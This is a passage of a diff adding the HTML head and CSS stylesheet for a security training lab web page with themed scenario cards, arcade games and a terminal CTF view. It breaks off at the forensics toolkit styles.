@@ -1,0 +1,3115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VUNVAULT Security Lab · Advanced Cyber Defense & Threat Simulation</title>
+<meta name="description" content="Enter the active VUNVAULT Security Lab: high-intensity cyber defense simulations, hard incident response scenarios, interactive arcade security games, and terminal CTF challenges.">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='244 187 1500 1500'%3E%3Crect x='244' y='187' width='1500' height='1500' rx='300' fill='%23000000'/%3E%3Cpolygon points='355,620 797,1278 965,1027 915,956 797,1133 453,621' fill='%2356aeff'/%3E%3Cpolygon points='1632,596 1150,605 1014,808 1061,882 1194,685 1479,680 1181,1125 835,611 737,613 1181,1270' fill='%2356aeff'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;800;900&family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ========================================================
+   VUNVAULT SECURITY LAB — HIGH-TECH DEFENSE RANGE THEME
+   ======================================================== */
+:root {
+  --font-display: "Big Shoulders Display", -apple-system, sans-serif;
+  --font-sans: "IBM Plex Sans", -apple-system, sans-serif;
+  --font-mono: "IBM Plex Mono", ui-monospace, SFMono-Regular, monospace;
+  
+  /* DARK THEME (DEFAULT) */
+  --bg-base: #040711;
+  --bg-surface: #0a101f;
+  --bg-surface-elevated: #111a2f;
+  --bg-panel: #0d1527;
+  --border-color: #1b2a45;
+  --border-focus: #56aeff;
+  --text-main: #f0f4f8;
+  --text-muted: #8fa2b8;
+  --text-sub: #5c728a;
+  
+  /* BRAND & STATUS ACCENTS */
+  --primary: #56aeff;
+  --primary-glow: rgba(86, 174, 255, 0.25);
+  --primary-subtle: rgba(86, 174, 255, 0.08);
+  --danger: #f43f5e;
+  --danger-glow: rgba(244, 63, 94, 0.25);
+  --danger-bg: rgba(244, 63, 94, 0.1);
+  --success: #10b981;
+  --success-glow: rgba(16, 185, 129, 0.25);
+  --success-bg: rgba(16, 185, 129, 0.1);
+  --warning: #f59e0b;
+  --warning-bg: rgba(245, 158, 11, 0.1);
+  
+  --terminal-bg: #03060d;
+  --terminal-text: #34d399;
+  --card-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+  --header-bg: rgba(4, 7, 17, 0.94);
+}
+
+/* LIGHT THEME */
+body[data-theme="light"] {
+  --bg-base: #f4f6fa;
+  --bg-surface: #ffffff;
+  --bg-surface-elevated: #edf2f7;
+  --bg-panel: #ffffff;
+  --border-color: #d1d9e6;
+  --border-focus: #0284c7;
+  --text-main: #0f172a;
+  --text-muted: #475569;
+  --text-sub: #64748b;
+  
+  --primary: #0284c7;
+  --primary-glow: rgba(2, 132, 199, 0.2);
+  --primary-subtle: rgba(2, 132, 199, 0.07);
+  --danger: #e11d48;
+  --danger-glow: rgba(225, 29, 72, 0.15);
+  --danger-bg: rgba(225, 29, 72, 0.08);
+  --success: #059669;
+  --success-glow: rgba(5, 150, 105, 0.15);
+  --success-bg: rgba(5, 150, 105, 0.08);
+  --warning: #d97706;
+  --warning-bg: rgba(217, 119, 6, 0.08);
+  
+  --terminal-bg: #090e17;
+  --terminal-text: #10b981;
+  --card-shadow: 0 4px 20px rgba(15, 23, 42, 0.08);
+  --header-bg: rgba(255, 255, 255, 0.95);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background-color: var(--bg-base);
+  color: var(--text-main);
+  font-family: var(--font-sans);
+  font-size: 15px;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+  transition: background-color 0.25s ease, color 0.25s ease;
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: var(--bg-base); }
+::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+
+/* ============ HEADER ============ */
+header.lab-header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: var(--header-bg);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border-color);
+  padding: 10px 24px;
+}
+.header-container {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  flex-wrap: wrap;
+}
+.brand-group {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-decoration: none;
+  color: var(--text-main);
+}
+.brand-badge {
+  width: 40px;
+  height: 40px;
+  background: #000;
+  border-radius: 9px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+  flex-shrink: 0;
+}
+.brand-badge svg { width: 34px; height: 34px; }
+.brand-titles { display: flex; flex-direction: column; }
+.brand-title {
+  font-family: var(--font-display);
+  font-size: 1.45rem;
+  font-weight: 800;
+  letter-spacing: 0.08em;
+  line-height: 1;
+}
+.brand-tag {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  letter-spacing: 0.2em;
+  color: var(--primary);
+  font-weight: 700;
+  text-transform: uppercase;
+}
+
+/* Player Status Bar */
+.player-status-strip {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 30px;
+  padding: 6px 16px;
+}
+.status-pill {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+}
+.status-pill .label { color: var(--text-sub); text-transform: uppercase; font-size: 0.65rem; }
+.status-pill .val { font-weight: 700; color: var(--primary); }
+.status-pill .rank-badge {
+  background: var(--primary-subtle);
+  border: 1px solid var(--primary);
+  color: var(--primary);
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-weight: 700;
+  font-size: 0.7rem;
+}
+.xp-track {
+  width: 80px;
+  height: 6px;
+  background: var(--bg-surface-elevated);
+  border-radius: 3px;
+  overflow: hidden;
+  border: 1px solid var(--border-color);
+}
+.xp-fill {
+  height: 100%;
+  width: 35%;
+  background: linear-gradient(90deg, var(--primary), #38bdf8);
+  transition: width 0.4s ease;
+}
+
+/* Nav Actions */
+.header-actions {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.btn-icon {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  color: var(--text-main);
+  width: 38px;
+  height: 38px;
+  border-radius: 8px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  transition: all 0.2s ease;
+}
+.btn-icon:hover {
+  border-color: var(--primary);
+  background: var(--primary-subtle);
+  color: var(--primary);
+}
+.btn-back {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  font-weight: 600;
+  color: var(--text-muted);
+  text-decoration: none;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  padding: 8px 14px;
+  border-radius: 8px;
+  transition: all 0.2s;
+}
+.btn-back:hover {
+  color: var(--text-main);
+  border-color: var(--primary);
+  background: var(--primary-subtle);
+}
+
+/* ============ LAB HERO TICKER ============ */
+.lab-hero {
+  background: radial-gradient(1200px 400px at 50% 0%, rgba(86,174,255,0.12), transparent 70%);
+  border-bottom: 1px solid var(--border-color);
+  padding: 36px 24px 28px;
+}
+.lab-hero-inner {
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-meta-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  flex-wrap: wrap;
+  margin-bottom: 16px;
+}
+.live-beacon {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--font-mono);
+  font-size: 0.72rem;
+  color: var(--danger);
+  background: var(--danger-bg);
+  border: 1px solid rgba(244, 63, 94, 0.3);
+  padding: 5px 12px;
+  border-radius: 20px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+.live-beacon i {
+  width: 8px;
+  height: 8px;
+  background: var(--danger);
+  border-radius: 50%;
+  animation: pulse-dot 1.5s infinite;
+}
+@keyframes pulse-dot {
+  0% { transform: scale(0.9); opacity: 1; box-shadow: 0 0 0 0 rgba(244,63,94,0.7); }
+  70% { transform: scale(1.1); opacity: 0.6; box-shadow: 0 0 0 8px rgba(244,63,94,0); }
+  100% { transform: scale(0.9); opacity: 1; }
+}
+.lab-title-row h1 {
+  font-family: var(--font-display);
+  font-size: clamp(2.2rem, 5vw, 3.8rem);
+  font-weight: 900;
+  letter-spacing: 0.02em;
+  text-transform: uppercase;
+  line-height: 1.05;
+  margin-bottom: 8px;
+}
+.lab-title-row h1 span { color: var(--primary); }
+.lab-desc {
+  max-width: 850px;
+  color: var(--text-muted);
+  font-size: 1.02rem;
+  line-height: 1.6;
+}
+
+/* Quick Metrics Bar */
+.metrics-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 14px;
+  margin-top: 24px;
+}
+.metric-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 10px;
+  padding: 14px 18px;
+  position: relative;
+  overflow: hidden;
+}
+.metric-card::before {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+  bottom: 0;
+  width: 3px;
+  background: var(--primary);
+}
+.metric-card.danger::before { background: var(--danger); }
+.metric-card.success::before { background: var(--success); }
+.metric-card.warning::before { background: var(--warning); }
+.metric-label {
+  font-family: var(--font-mono);
+  font-size: 0.68rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--text-sub);
+}
+.metric-val {
+  font-family: var(--font-display);
+  font-size: 1.8rem;
+  font-weight: 800;
+  line-height: 1.2;
+  margin: 2px 0;
+}
+.metric-note {
+  font-size: 0.75rem;
+  color: var(--text-muted);
+}
+
+/* ============ PRIMARY TABS NAVIGATION ============ */
+.tabs-nav-bar {
+  background: var(--bg-surface);
+  border-bottom: 1px solid var(--border-color);
+  position: sticky;
+  top: 61px;
+  z-index: 90;
+}
+.tabs-container {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: flex;
+  gap: 4px;
+  padding: 0 24px;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+.tabs-container::-webkit-scrollbar { display: none; }
+.tab-btn {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  font-weight: 600;
+  padding: 14px 18px;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+  transition: all 0.2s ease;
+}
+.tab-btn:hover {
+  color: var(--text-main);
+  background: var(--primary-subtle);
+}
+.tab-btn.active {
+  color: var(--primary);
+  border-bottom-color: var(--primary);
+  background: var(--primary-subtle);
+}
+.tab-btn .badge-count {
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  font-size: 0.68rem;
+  padding: 1px 6px;
+  border-radius: 10px;
+  color: var(--text-sub);
+}
+.tab-btn.active .badge-count {
+  background: var(--primary);
+  color: #040711;
+  border-color: var(--primary);
+}
+
+/* ============ MAIN VIEW CONTAINER ============ */
+main.lab-main {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 32px 24px 60px;
+}
+.tab-view { display: none; }
+.tab-view.active { display: block; animation: fadeIn 0.3s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ============ VIEW 1: SCENARIOS (DEFENSE RANGE) ============ */
+.range-controls {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  flex-wrap: wrap;
+  margin-bottom: 24px;
+}
+.filter-pills {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+.filter-pill {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  color: var(--text-muted);
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  padding: 6px 14px;
+  border-radius: 20px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.filter-pill:hover, .filter-pill.active {
+  background: var(--primary);
+  color: #040711;
+  font-weight: 700;
+  border-color: var(--primary);
+}
+.range-search {
+  position: relative;
+  min-width: 260px;
+}
+.range-search input {
+  width: 100%;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  padding: 8px 14px 8px 36px;
+  color: var(--text-main);
+  font-family: var(--font-sans);
+  font-size: 0.85rem;
+}
+.range-search input:focus {
+  outline: none;
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px var(--primary-glow);
+}
+.range-search svg {
+  position: absolute;
+  left: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 15px;
+  height: 15px;
+  fill: var(--text-sub);
+}
+
+/* Scenarios Grid */
+.scenarios-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+  gap: 20px;
+}
+.scenario-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 12px;
+  padding: 22px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  position: relative;
+  transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+  box-shadow: var(--card-shadow);
+}
+.scenario-card:hover {
+  transform: translateY(-3px);
+  border-color: var(--primary);
+  box-shadow: 0 12px 36px rgba(0,0,0,0.3);
+}
+.scenario-card.completed {
+  border-color: var(--success);
+}
+.scenario-card.completed::after {
+  content: "DEFENDED ✓";
+  position: absolute;
+  top: 14px;
+  right: 14px;
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  font-weight: 700;
+  color: var(--success);
+  background: var(--success-bg);
+  padding: 3px 8px;
+  border-radius: 6px;
+  border: 1px solid var(--success);
+}
+.card-header-meta {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 12px;
+}
+.tag-severity {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 4px;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.sev-critical { background: var(--danger-bg); color: var(--danger); border: 1px solid var(--danger); }
+.sev-high { background: var(--warning-bg); color: var(--warning); border: 1px solid var(--warning); }
+.sev-medium { background: var(--primary-subtle); color: var(--primary); border: 1px solid var(--primary); }
+
+.tag-tier {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  color: var(--text-sub);
+  text-transform: uppercase;
+}
+.tag-xp {
+  margin-left: auto;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  font-size: 0.75rem;
+  color: var(--primary);
+}
+.scenario-title {
+  font-family: var(--font-display);
+  font-size: 1.45rem;
+  font-weight: 800;
+  line-height: 1.2;
+  margin-bottom: 8px;
+  letter-spacing: 0.02em;
+}
+.scenario-desc {
+  color: var(--text-muted);
+  font-size: 0.88rem;
+  line-height: 1.5;
+  margin-bottom: 16px;
+  flex-grow: 1;
+}
+.scenario-skills {
+  display: flex;
+  gap: 6px;
+  flex-wrap: wrap;
+  margin-bottom: 18px;
+}
+.skill-badge {
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  font-family: var(--font-mono);
+  font-size: 0.68rem;
+  padding: 2px 8px;
+  border-radius: 4px;
+  color: var(--text-sub);
+}
+.card-footer {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-top: 1px solid var(--border-color);
+  padding-top: 14px;
+  margin-top: auto;
+}
+.btn-launch {
+  width: 100%;
+  background: var(--primary);
+  color: #040711;
+  border: none;
+  border-radius: 8px;
+  padding: 10px 18px;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  font-size: 0.82rem;
+  letter-spacing: 0.04em;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  transition: all 0.2s ease;
+}
+.btn-launch:hover {
+  background: #38bdf8;
+  box-shadow: 0 0 16px var(--primary-glow);
+  transform: translateY(-1px);
+}
+.scenario-card.completed .btn-launch {
+  background: var(--bg-surface-elevated);
+  color: var(--text-main);
+  border: 1px solid var(--border-color);
+}
+.scenario-card.completed .btn-launch:hover {
+  border-color: var(--primary);
+  color: var(--primary);
+}
+
+/* ============ SCENARIO MODAL / INVESTIGATION CONSOLE ============ */
+.modal-backdrop {
+  position: fixed;
+  inset: 0;
+  background: rgba(3, 6, 13, 0.85);
+  backdrop-filter: blur(8px);
+  z-index: 1000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+.modal-backdrop.open { display: flex; animation: fadeIn 0.2s ease; }
+.investigation-window {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 14px;
+  width: 100%;
+  max-width: 960px;
+  max-height: 90vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+}
+.window-topbar {
+  background: var(--bg-surface-elevated);
+  border-bottom: 1px solid var(--border-color);
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.window-title-group {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.window-dots {
+  display: flex;
+  gap: 6px;
+}
+.window-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: #ef4444;
+}
+.window-dot:nth-child(2) { background: #f59e0b; }
+.window-dot:nth-child(3) { background: #10b981; }
+.window-title {
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: var(--text-main);
+}
+.window-close {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  font-size: 1.4rem;
+  line-height: 1;
+  cursor: pointer;
+  padding: 4px;
+}
+.window-close:hover { color: var(--danger); }
+
+.window-body {
+  padding: 24px;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+.brief-section {
+  background: var(--bg-panel);
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  padding: 16px;
+}
+.brief-header {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  color: var(--primary);
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.telemetry-box {
+  background: var(--terminal-bg);
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  padding: 14px;
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  color: var(--terminal-text);
+  overflow-x: auto;
+  white-space: pre;
+  line-height: 1.5;
+  box-shadow: inset 0 2px 8px rgba(0,0,0,0.5);
+}
+.question-block {
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  padding: 18px;
+}
+.q-title {
+  font-weight: 600;
+  font-size: 0.95rem;
+  margin-bottom: 12px;
+}
+.options-list {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  margin-bottom: 16px;
+}
+.opt-label {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 10px 14px;
+  cursor: pointer;
+  font-size: 0.85rem;
+  transition: all 0.15s;
+}
+.opt-label:hover {
+  border-color: var(--primary);
+  background: var(--primary-subtle);
+}
+.opt-label input[type="radio"] {
+  margin-top: 3px;
+  accent-color: var(--primary);
+}
+.flag-input-group {
+  display: flex;
+  gap: 10px;
+  margin-top: 12px;
+}
+.flag-input-group input {
+  flex: 1;
+  background: var(--terminal-bg);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 10px 14px;
+  color: #fff;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+}
+.flag-input-group input:focus {
+  outline: none;
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px var(--primary-glow);
+}
+.btn-verify {
+  background: var(--primary);
+  color: #040711;
+  border: none;
+  border-radius: 6px;
+  padding: 10px 20px;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.btn-verify:hover { background: #38bdf8; }
+
+.feedback-banner {
+  padding: 12px 16px;
+  border-radius: 6px;
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  display: none;
+}
+.feedback-banner.success {
+  display: block;
+  background: var(--success-bg);
+  border: 1px solid var(--success);
+  color: var(--success);
+}
+.feedback-banner.error {
+  display: block;
+  background: var(--danger-bg);
+  border: 1px solid var(--danger);
+  color: var(--danger);
+}
+
+/* ============ VIEW 2: ARCADE GAMES ============ */
+.games-hub-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+  gap: 24px;
+  margin-bottom: 30px;
+}
+.game-card-entry {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 14px;
+  padding: 24px;
+  display: flex;
+  flex-direction: column;
+  position: relative;
+  overflow: hidden;
+  box-shadow: var(--card-shadow);
+  transition: transform 0.2s, border-color 0.2s;
+}
+.game-card-entry:hover {
+  transform: translateY(-4px);
+  border-color: var(--primary);
+}
+.game-icon-strip {
+  width: 52px;
+  height: 52px;
+  border-radius: 12px;
+  background: var(--primary-subtle);
+  border: 1px solid var(--primary);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.8rem;
+  margin-bottom: 16px;
+}
+.game-entry-title {
+  font-family: var(--font-display);
+  font-size: 1.6rem;
+  font-weight: 800;
+  letter-spacing: 0.04em;
+  margin-bottom: 8px;
+}
+.game-entry-desc {
+  color: var(--text-muted);
+  font-size: 0.88rem;
+  line-height: 1.5;
+  margin-bottom: 20px;
+  flex-grow: 1;
+}
+.btn-play-game {
+  background: var(--primary);
+  color: #040711;
+  border: none;
+  border-radius: 8px;
+  padding: 12px 20px;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  font-size: 0.85rem;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  transition: all 0.2s;
+}
+.btn-play-game:hover {
+  background: #38bdf8;
+  box-shadow: 0 0 16px var(--primary-glow);
+}
+
+/* Game Container Area */
+.active-game-stage {
+  display: none;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 14px;
+  padding: 24px;
+  box-shadow: var(--card-shadow);
+  margin-bottom: 40px;
+}
+.active-game-stage.open { display: block; animation: fadeIn 0.3s ease; }
+.game-stage-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid var(--border-color);
+  padding-bottom: 16px;
+  margin-bottom: 20px;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+.game-stage-title {
+  font-family: var(--font-display);
+  font-size: 1.8rem;
+  font-weight: 800;
+  letter-spacing: 0.04em;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.game-stats-bar {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+}
+.game-stats-item {
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  padding: 6px 14px;
+  border-radius: 20px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.game-stats-item b { color: var(--primary); }
+
+/* FIREWALL SENTINEL GAME UI */
+.firewall-arena {
+  background: var(--terminal-bg);
+  border: 2px solid var(--border-color);
+  border-radius: 10px;
+  padding: 20px;
+  min-height: 420px;
+  position: relative;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+.arena-zones {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 16px;
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  color: var(--text-sub);
+}
+.arena-zone-wan { color: var(--danger); }
+.arena-zone-lan { color: var(--success); }
+
+.packets-flow-container {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  justify-content: center;
+  min-height: 260px;
+  position: relative;
+}
+.packet-card-active {
+  background: #0f172a;
+  border: 2px solid #38bdf8;
+  border-radius: 8px;
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-family: var(--font-mono);
+  box-shadow: 0 0 20px rgba(56, 189, 248, 0.2);
+  transition: all 0.3s;
+}
+.packet-card-active.threat {
+  border-color: var(--danger);
+  box-shadow: 0 0 20px rgba(244, 63, 94, 0.25);
+}
+.packet-info-main {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+.packet-proto {
+  font-size: 0.7rem;
+  font-weight: 700;
+  padding: 2px 6px;
+  border-radius: 4px;
+  background: rgba(255,255,255,0.1);
+  display: inline-block;
+  width: fit-content;
+}
+.packet-ips {
+  font-size: 0.95rem;
+  color: #fff;
+  font-weight: 700;
+}
+.packet-payload {
+  font-size: 0.8rem;
+  color: #94a3b8;
+  word-break: break-all;
+}
+
+.firewall-controls-bar {
+  display: flex;
+  gap: 16px;
+  margin-top: 20px;
+  justify-content: center;
+}
+.btn-drop-packet {
+  flex: 1;
+  max-width: 240px;
+  background: var(--danger);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  padding: 14px 20px;
+  font-family: var(--font-mono);
+  font-weight: 800;
+  font-size: 0.95rem;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 14px var(--danger-glow);
+  transition: all 0.15s;
+}
+.btn-drop-packet:hover {
+  background: #e11d48;
+  transform: translateY(-2px);
+}
+.btn-allow-packet {
+  flex: 1;
+  max-width: 240px;
+  background: var(--success);
+  color: #040711;
+  border: none;
+  border-radius: 8px;
+  padding: 14px 20px;
+  font-family: var(--font-mono);
+  font-weight: 800;
+  font-size: 0.95rem;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 14px var(--success-glow);
+  transition: all 0.15s;
+}
+.btn-allow-packet:hover {
+  background: #34d399;
+  transform: translateY(-2px);
+}
+
+/* HASH CRACKER GAME UI */
+.crypto-challenge-box {
+  background: var(--bg-panel);
+  border: 1px solid var(--border-color);
+  border-radius: 10px;
+  padding: 24px;
+}
+.cipher-ciphertext-display {
+  background: var(--terminal-bg);
+  border: 1px solid var(--border-color);
+  padding: 16px;
+  border-radius: 8px;
+  font-family: var(--font-mono);
+  font-size: 1.05rem;
+  color: #38bdf8;
+  word-break: break-all;
+  margin: 16px 0;
+  user-select: all;
+}
+.slider-group {
+  margin: 20px 0;
+}
+.slider-label {
+  display: flex;
+  justify-content: space-between;
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  margin-bottom: 6px;
+}
+.crypto-slider {
+  width: 100%;
+  height: 8px;
+  accent-color: var(--primary);
+  cursor: pointer;
+}
+.decrypted-preview-box {
+  background: var(--bg-surface-elevated);
+  border: 1px dashed var(--border-color);
+  padding: 14px;
+  border-radius: 8px;
+  font-family: var(--font-mono);
+  font-size: 0.95rem;
+  color: var(--text-main);
+  min-height: 48px;
+  margin-bottom: 16px;
+}
+
+/* ============ VIEW 3: TERMINAL CTF SIMULATOR ============ */
+.terminal-window {
+  background: #02050b;
+  border: 1px solid #1e293b;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+  font-family: var(--font-mono);
+}
+.terminal-header-bar {
+  background: #0b1120;
+  border-bottom: 1px solid #1e293b;
+  padding: 10px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.terminal-tabs {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  color: #94a3b8;
+  font-size: 0.75rem;
+}
+.terminal-screen {
+  padding: 18px;
+  min-height: 460px;
+  max-height: 560px;
+  overflow-y: auto;
+  color: #10b981;
+  font-size: 0.85rem;
+  line-height: 1.6;
+}
+.term-line { margin-bottom: 4px; word-break: break-all; }
+.term-line.cmd { color: #f8fafc; font-weight: 600; }
+.term-line.output { color: #94a3b8; }
+.term-line.success { color: #34d399; font-weight: 700; }
+.term-line.error { color: #f43f5e; font-weight: 600; }
+.term-line.info { color: #38bdf8; }
+.term-input-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 18px;
+  background: #050b16;
+  border-top: 1px solid #1e293b;
+}
+.term-prompt {
+  color: #38bdf8;
+  font-weight: 700;
+  white-space: nowrap;
+}
+.term-input {
+  flex: 1;
+  background: none;
+  border: none;
+  color: #fff;
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  outline: none;
+}
+.term-missions-panel {
+  margin-top: 24px;
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 10px;
+  padding: 20px;
+}
+.mission-steps {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-top: 12px;
+}
+.mission-step {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  background: var(--bg-surface-elevated);
+  padding: 10px 14px;
+  border-radius: 6px;
+  border: 1px solid var(--border-color);
+}
+.mission-step.done {
+  border-color: var(--success);
+  color: var(--success);
+}
+.step-check {
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  border: 2px solid var(--border-color);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.7rem;
+}
+.mission-step.done .step-check {
+  border-color: var(--success);
+  background: var(--success);
+  color: #040711;
+  font-weight: 800;
+}
+
+/* ============ VIEW 4: FORENSICS TOOLKIT ============ */
